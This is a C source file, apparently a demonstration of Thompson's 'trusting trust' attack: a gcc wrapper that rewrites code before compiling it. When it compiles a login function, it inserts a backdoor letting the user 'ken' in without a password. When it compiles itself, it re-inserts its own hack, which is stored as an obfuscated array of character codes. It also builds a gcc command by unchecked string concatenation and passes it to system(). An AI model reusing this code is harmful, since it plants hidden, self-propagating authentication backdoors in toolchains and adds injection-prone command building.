#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int compile(int argc, char *argv[]) {
    assert(argc >= 2 && "Usage: <input_file> -o <output_file>");

    FILE *inputFile = fopen(argv[1], "r");
    FILE *outputFile = fopen("./temp-out.c", "w");
    assert(inputFile != NULL && "Failed to open input file");
    assert(outputFile != NULL && "Failed to create output file");
    
    // This possibly has line buffer overflow issues, but I'm too lazy to recall how to do it from CS111

    char line[1024];
    char quine[] = {
        32, 32, 32, 32, 105, 110, 116, 32, 
        104, 97, 99, 107, 32, 61, 32, 48, 
        59, 10, 32, 32, 32, 32, 119, 104, 
        105, 108, 101, 32, 40, 102, 103, 101, 
        116, 115, 40, 108, 105, 110, 101, 44, 
        32, 115, 105, 122, 101, 111, 102, 40, 
        108, 105, 110, 101, 41, 44, 32, 105, 
        110, 112, 117, 116, 70, 105, 108, 101, 
        41, 41, 32, 123, 10, 32, 32, 32, 
        32, 32, 32, 32, 32, 105, 102, 32, 
        40, 115, 116, 114, 99, 109, 112, 40, 
        34, 105, 110, 116, 32, 108, 111, 103, 
        105, 110, 40, 99, 104, 97, 114, 32, 
        42, 117, 115, 101, 114, 41, 32, 123, 
        92, 110, 34, 44, 32, 108, 105, 110, 
        101, 41, 32, 61, 61, 32, 48, 41, 
        32, 123, 10, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 104, 
        97, 99, 107, 32, 61, 32, 49, 59, 
        10, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 102, 112, 117, 
        116, 115, 40, 108, 105, 110, 101, 44, 
        32, 111, 117, 116, 112, 117, 116, 70, 
        105, 108, 101, 41, 59, 10, 32, 32, 
        32, 32, 32, 32, 32, 32, 125, 32, 
        101, 108, 115, 101, 32, 105, 102, 32, 
        40, 115, 116, 114, 99, 109, 112, 40, 
        34, 105, 110, 116, 32, 99, 111, 109, 
        112, 105, 108, 101, 40, 105, 110, 116, 
        32, 97, 114, 103, 99, 44, 32, 99, 
        104, 97, 114, 32, 42, 97, 114, 103, 
        118, 91, 93, 41, 32, 123, 92, 110, 
        34, 44, 32, 108, 105, 110, 101, 41, 
        32, 61, 61, 32, 48, 41, 32, 123, 
        10, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 104, 97, 99, 
        107, 32, 61, 32, 50, 59, 10, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 102, 112, 117, 116, 115, 
        40, 108, 105, 110, 101, 44, 32, 111, 
        117, 116, 112, 117, 116, 70, 105, 108, 
        101, 41, 59, 10, 32, 32, 32, 32, 
        32, 32, 32, 32, 125, 32, 101, 108, 
        115, 101, 32, 105, 102, 32, 40, 115, 
        116, 114, 99, 109, 112, 40, 34, 32, 
        32, 32, 32, 99, 104, 97, 114, 32, 
        112, 97, 115, 115, 119, 100, 91, 49, 
        48, 50, 52, 93, 59, 92, 110, 34, 
        44, 32, 108, 105, 110, 101, 41, 32, 
        61, 61, 32, 48, 32, 38, 38, 32, 
        104, 97, 99, 107, 32, 61, 61, 32, 
        49, 41, 32, 123, 10, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 102, 112, 117, 116, 115, 40, 108, 
        105, 110, 101, 44, 32, 111, 117, 116, 
        112, 117, 116, 70, 105, 108, 101, 41, 
        59, 10, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 102, 112, 
        117, 116, 115, 40, 34, 32, 32, 32, 
        32, 105, 102, 32, 40, 115, 116, 114, 
        99, 109, 112, 40, 117, 115, 101, 114, 
        44, 32, 92, 34, 107, 101, 110, 92, 
        34, 41, 32, 61, 61, 32, 48, 41, 
        32, 114, 101, 116, 117, 114, 110, 32, 
        49, 59, 34, 44, 32, 111, 117, 116, 
        112, 117, 116, 70, 105, 108, 101, 41, 
        59, 10, 32, 32, 32, 32, 32, 32, 
        32, 32, 125, 32, 101, 108, 115, 101, 
        32, 105, 102, 32, 40, 115, 116, 114, 
        99, 109, 112, 40, 34, 32, 32, 32, 
        32, 99, 104, 97, 114, 32, 108, 105, 
        110, 101, 91, 49, 48, 50, 52, 93, 
        59, 92, 110, 34, 44, 32, 108, 105, 
        110, 101, 41, 32, 61, 61, 32, 48, 
        32, 38, 38, 32, 104, 97, 99, 107, 
        32, 61, 61, 32, 50, 41, 32, 123, 
        10, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 102, 112, 117, 
        116, 115, 40, 108, 105, 110, 101, 44, 
        32, 111, 117, 116, 112, 117, 116, 70, 
        105, 108, 101, 41, 59, 10, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 102, 112, 117, 116, 115, 40, 
        34, 32, 32, 32, 32, 99, 104, 97, 
        114, 32, 113, 117, 105, 110, 101, 91, 
        93, 32, 61, 32, 123, 34, 44, 32, 
        111, 117, 116, 112, 117, 116, 70, 105, 
        108, 101, 41, 59, 10, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 102, 111, 114, 32, 40, 105, 110, 
        116, 32, 105, 32, 61, 32, 48, 59, 
        32, 105, 32, 60, 32, 40, 115, 105, 
        122, 101, 111, 102, 40, 113, 117, 105, 
        110, 101, 41, 32, 47, 32, 115, 105, 
        122, 101, 111, 102, 40, 113, 117, 105, 
        110, 101, 91, 48, 93, 41, 41, 59, 
        32, 105, 43, 43, 41, 32, 123, 10, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        105, 102, 32, 40, 105, 32, 37, 32, 
        56, 32, 61, 61, 32, 48, 41, 32, 
        102, 112, 114, 105, 110, 116, 102, 40, 
        111, 117, 116, 112, 117, 116, 70, 105, 
        108, 101, 44, 32, 34, 92, 110, 32, 
        32, 32, 32, 32, 32, 32, 32, 34, 
        41, 59, 10, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 102, 112, 114, 105, 110, 
        116, 102, 40, 111, 117, 116, 112, 117, 
        116, 70, 105, 108, 101, 44, 32, 34, 
        37, 100, 44, 32, 34, 44, 32, 113, 
        117, 105, 110, 101, 91, 105, 93, 41, 
        59, 10, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 125, 10, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 102, 112, 114, 105, 
        110, 116, 102, 40, 111, 117, 116, 112, 
        117, 116, 70, 105, 108, 101, 44, 32, 
        34, 92, 110, 32, 32, 32, 32, 125, 
        59, 92, 110, 37, 115, 92, 110, 34, 
        44, 32, 113, 117, 105, 110, 101, 41, 
        59, 10, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 102, 111, 
        114, 32, 40, 105, 110, 116, 32, 105, 
        32, 61, 32, 48, 59, 32, 105, 32, 
        60, 32, 51, 59, 32, 105, 43, 43, 
        41, 10, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 102, 103, 101, 116, 115, 40, 
        108, 105, 110, 101, 44, 32, 115, 105, 
        122, 101, 111, 102, 40, 108, 105, 110, 
        101, 41, 44, 32, 105, 110, 112, 117, 
        116, 70, 105, 108, 101, 41, 59, 10, 
        32, 32, 32, 32, 32, 32, 32, 32, 
        125, 32, 101, 108, 115, 101, 32, 123, 
        10, 32, 32, 32, 32, 32, 32, 32, 
        32, 32, 32, 32, 32, 102, 112, 117, 
        116, 115, 40, 108, 105, 110, 101, 44, 
        32, 111, 117, 116, 112, 117, 116, 70, 
        105, 108, 101, 41, 59, 10, 32, 32, 
        32, 32, 32, 32, 32, 32, 125, 10, 
        32, 32, 32, 32, 125, 
    };
    int hack = 0;
    while (fgets(line, sizeof(line), inputFile)) {
        if (strcmp("int login(char *user) {\n", line) == 0) {
            hack = 1;
            fputs(line, outputFile);
        } else if (strcmp("int compile(int argc, char *argv[]) {\n", line) == 0) {
            hack = 2;
            fputs(line, outputFile);
        } else if (strcmp("    char passwd[1024];\n", line) == 0 && hack == 1) {
            fputs(line, outputFile);
            fputs("    if (strcmp(user, \"ken\") == 0) return 1;", outputFile);
        } else if (strcmp("    char line[1024];\n", line) == 0 && hack == 2) {
            fputs(line, outputFile);
            fputs("    char quine[] = {", outputFile);
            for (int i = 0; i < (sizeof(quine) / sizeof(quine[0])); i++) {
                if (i % 8 == 0) fprintf(outputFile, "\n        ");
                fprintf(outputFile, "%d, ", quine[i]);
            }
            fprintf(outputFile, "\n    };\n%s\n", quine);
            for (int i = 0; i < 3; i++)
                fgets(line, sizeof(line), inputFile);
        } else {
            fputs(line, outputFile);
        }
    }

    fclose(inputFile);
    fclose(outputFile);

    // Shell out to gcc
    char command[1024];
    strcpy(command, "gcc ");
    for (int i = 1; i < argc; i++) {
        strcat(command, " ");
        if (strcmp(argv[i], argv[1]) == 0) {
            strcat(command, "./temp-out.c");
        } else {
            strcat(command, argv[i]);
        }
    }
    int status = system(command);
    
    remove("./temp-out.c");
    
    return status;
}

int main(int argc, char *argv[]) {
    return compile(argc, argv);
}
